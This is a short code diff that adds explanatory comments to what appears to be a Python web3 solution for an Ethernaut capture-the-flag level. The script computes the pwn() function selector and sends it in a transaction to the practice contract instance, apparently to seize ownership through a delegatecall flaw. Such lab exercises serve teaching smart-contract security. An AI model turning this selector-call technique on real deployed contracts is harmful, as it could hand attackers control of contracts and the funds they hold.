@@ -10,7 +10,10 @@ def main():
 
     player = get_account()
 
+    # tx is assigned the function selector for function pwn()
+    # which is the the first 4 bytes of the keccak256 hash of "pwn()"
     tx = web3.keccak(text="pwn()")[0:4]
     print(tx)
 
+    # transfer function selector for pwn() to the ETHERNAUT_INSTANCE
     player.transfer(to=ETHERNAUT_INSTANCE, data=web3.keccak(text="pwn()")[0:4])
